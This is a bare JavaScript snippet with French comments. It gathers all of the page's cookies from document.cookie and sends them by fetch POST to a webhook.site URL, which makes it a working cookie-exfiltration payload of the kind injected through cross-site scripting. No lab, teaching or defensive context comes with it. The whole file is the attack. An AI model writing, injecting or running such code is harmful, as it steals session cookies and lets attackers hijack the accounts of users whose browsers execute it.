// Fonction pour récupérer les cookies
var getCookies = function() {
  var pairs = document.cookie.split(";");
  var cookies = {};
  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].split("=");
    cookies[pair[0].trim()] = decodeURIComponent(pair.slice(1).join("="));
  }
  return cookies;
}

var myCookies = getCookies();

// Webhook URL
var url = "https://webhook.site/cc3863eb-0c66-40a6-88d7-a4cb0ee9b5f1";

// Corps de la requête avec les cookies
var data = {
  content: "Hi",
  cookies: myCookies
};

// Envoi de la requête
fetch(url, {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(data)
})
.then(response => response.text())
.then(console.log)
.catch(console.error);
